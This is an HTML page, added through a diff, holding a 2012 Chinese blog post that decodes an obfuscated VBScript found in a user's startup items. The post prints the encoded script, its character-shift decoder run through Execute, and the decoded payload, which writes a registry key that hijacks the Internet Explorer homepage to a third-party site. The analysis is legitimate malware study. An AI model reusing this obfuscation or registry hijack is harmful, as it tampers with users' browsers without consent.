@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="vbs,解密," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="&amp;nbsp;&amp;nbsp; 今天上90sec论坛看见一同学发帖！说他启动项有个vbs，希望有人分析分析！  原vbs： ExeString=&quot;hh dkloqlerngeg_xsSdmw6Cq^[tdHjd (!pmcqbjt-lbeke) q.Q^aWqbneBKDRYCK:MSDLYRNHNBEMICUu86&amp;#42=521&amp;#42-3+;0,&amp;#42&amp;#4268&amp;amp">
+<meta name="keywords" content="vbs,解密">
+<meta property="og:type" content="article">
+<meta property="og:title" content="解密一修改主页的vbs">
+<meta property="og:url" content="http://yoursite.com/2012/02/26/解密一修改主页的vbs/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="&amp;nbsp;&amp;nbsp; 今天上90sec论坛看见一同学发帖！说他启动项有个vbs，希望有人分析分析！  原vbs： ExeString=&quot;hh dkloqlerngeg_xsSdmw6Cq^[tdHjd (!pmcqbjt-lbeke) q.Q^aWqbneBKDRYCK:MSDLYRNHNBEMICUu86&amp;#42=521&amp;#42-3+;0,&amp;#42&amp;#4268&amp;amp">
+<meta property="og:updated_time" content="2018-02-26T05:36:35.265Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="解密一修改主页的vbs">
+<meta name="twitter:description" content="&amp;nbsp;&amp;nbsp; 今天上90sec论坛看见一同学发帖！说他启动项有个vbs，希望有人分析分析！  原vbs： ExeString=&quot;hh dkloqlerngeg_xsSdmw6Cq^[tdHjd (!pmcqbjt-lbeke) q.Q^aWqbneBKDRYCK:MSDLYRNHNBEMICUu86&amp;#42=521&amp;#42-3+;0,&amp;#42&amp;#4268&amp;amp">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2012/02/26/解密一修改主页的vbs/"/>
+
+
+
+
+
+  <title>解密一修改主页的vbs | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2012/02/26/解密一修改主页的vbs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">解密一修改主页的vbs</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2012-02-26T13:51:04+08:00">
+                2012-02-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/技术文章/" itemprop="url" rel="index">
+                    <span itemprop="name">技术文章</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><a href="/admin/ http:/www.letao.com/lianmeng/manage/linkImage.aspx?wh=570&amp;ht=80&amp;wid=94&amp;sid=duyihan"></a></p>
+<p>&nbsp;&nbsp; 今天上90sec论坛看见一同学发帖！说他启动项有个vbs，希望有人分析分析！</p>
+<hr>
+<p>原vbs：</p>
+<pre class="brush:vb; toolbar: true; auto-links: true;">ExeString="hh dkloqlerngeg_xsSdmw6Cq^[tdHjd
+(!pmcqbjt-lbeke) q.Q^aWqbneBKDRYCK:MSDLYRNHNBEMICUu86&#42=521&#42-3+;0,&#42&#4268&amp;;2D:’07)&#422A,&#423/2&gt;}[lbekeVOo^hHnf_P``_Bhgm`g^!%B3VPqhar`fFhe_s[Bhtdkhes?xoeirdkVidqjlnk_.dq_ gmnp9()wvp(62,q.m^n.bg)?k2        p(Rd`Qrhm_ !AEEXX=UQK?NSXOSDKVSn_nw`k_Lb]rnlifsUCns^lndmEwifoq^lLZcn[LnaqmP``_+hsmj:.(qwv’032p(cnf)?k2"
+Execute("Dim KeyArr(3),ThisText"&amp;vbCrLf&amp;"KeyArr(0) = 1"&amp;vbCrLf&amp;"KeyArr(1) = 7"&amp;vbCrLf&amp;"KeyArr(2) = 6"&amp;vbCrLf&amp;"KeyArr(3) = 0"&amp;vbCrLf&amp;"For i=1 To Len(ExeString)"&amp;vbCrLf&amp;"TempNum = Asc(Mid(ExeString,i,1))"&amp;vbCrLf&amp;"If TempNum = 18 Then"&amp;vbCrLf&amp;"TempNum = 34"&amp;vbCrLf&amp;"End If"&amp;vbCrLf&amp;"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&amp;vbCrLf&amp;"If TempChar = Chr(28) Then"&amp;vbCrLf&amp;"TempChar = vbCr"&amp;vbCrLf&amp;"ElseIf TempChar = Chr(29) Then"&amp;vbCrLf&amp;"TempChar = vbLf"&amp;vbCrLf&amp;"End If"&amp;vbCrLf&amp;"ThisText = ThisText &amp; TempChar"&amp;vbCrLf&amp;"Next")
+Execute(ThisText)</pre> 
+
+<hr>
+<p>直接解密输出1.txt文本</p>
+<pre class="brush:vb; toolbar: true; auto-links: true;">ExeString="hh dkloqlerngeg_xsSdmw6Cq^[tdHjd
+(!pmcqbjt-lbeke) q.Q^aWqbneBKDRYCK:MSDLYRNHNBEMICUu86&#42=521&#42-3+;0,&#42&#4268&amp;;2D:’07)&#422A,&#423/2&gt;}[lbekeVOo^hHnf_P``_Bhgm`g^!%B3VPqhar`fFhe_s[Bhtdkhes?xoeirdkVidqjlnk_.dq_ gmnp9()wvp(62,q.m^n.bg)?k2        p(Rd`Qrhm_ !AEEXX=UQK?NSXOSDKVSn_nw`k_Lb]rnlifsUCns^lndmEwifoq^lLZcn[LnaqmP``_+hsmj:.(qwv’032p(cnf)?k2"
+Execute("Dim KeyArr(3),ThisText"&amp;vbCrLf&amp;"KeyArr(0) = 1"&amp;vbCrLf&amp;"KeyArr(1) = 7"&amp;vbCrLf&amp;"KeyArr(2) = 6"&amp;vbCrLf&amp;"KeyArr(3) = 0"&amp;vbCrLf&amp;"For i=1 To Len(ExeString)"&amp;vbCrLf&amp;"TempNum = Asc(Mid(ExeString,i,1))"&amp;vbCrLf&amp;"If TempNum = 18 Then"&amp;vbCrLf&amp;"TempNum = 34"&amp;vbCrLf&amp;"End If"&amp;vbCrLf&amp;"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&amp;vbCrLf&amp;"If TempChar = Chr(28) Then"&amp;vbCrLf&amp;"TempChar = vbCr"&amp;vbCrLf&amp;"ElseIf TempChar = Chr(29) Then"&amp;vbCrLf&amp;"TempChar = vbLf"&amp;vbCrLf&amp;"End If"&amp;vbCrLf&amp;"ThisText = ThisText &amp; TempChar"&amp;vbCrLf&amp;"Next")
+Execute(ThisText)
+Dim A, B
+A = ThisText
+B = "1.txt"
+Set FSO = CreateObject("Scripting.FileSystemObject")
+Set TextFile = FSO.CreateTextFile(B)
+TextFile.WriteLine A
+TextFile.Close()</pre> 
+
+<hr>
+<p>1.txt文本内容</p>
+<pre class="brush:vb; toolbar: true; auto-links: true;">on error resume next
+Set w = CreateObject("wscript.shell")!
+w.RegWrite "HKEY_CLASSES_ROOTCLSID{871C5380-42A0-1069-A2EA-08002B30309D}shellOpenHomePageCommand", "C:Program FilesInternet Exploreriexplore.exe http://www.633w.net.cn/?l9"
+!’&amp; !’&amp; q/XdaXxhnf&amp;!BLKXYD[QLFTSYVYDL]Yn`u}`lfbLcdxnmplsVJts_stdn!Kwjmuq_sbL[jt[Mugqn!V`af(+#nsnq@.)x}v(792q/ing0Ek3#</pre> 
+
+<hr>
+<p>这段代码还有部分没解出来，但是基本可以明白怎么回事了！</p>
+<p>他就是修改你的注册表，把<a href="http://www.633w.net.cn" target="_blank" rel="noopener">http://www.633w.net.cn</a>弄成你ie浏览器的主页！</p>
+<p>&nbsp;</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/vbs/" rel="tag"># vbs</a>
+          
+            <a href="/tags/解密/" rel="tag"># 解密</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2012/02/25/全功能PHP-SHELL汉化版修改版/" rel="next" title="全功能PHP SHELL汉化版修改版">
+                <i class="fa fa-chevron-left"></i> 全功能PHP SHELL汉化版修改版
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2012/03/07/emlog博客程序后台拿shell/" rel="prev" title="emlog博客程序后台拿shell">
+                emlog博客程序后台拿shell <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">165</span>
+                  <span class="site-state-item-name">Artikel</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">Kategorien</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">183</span>
+                  <span class="site-state-item-name">Tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
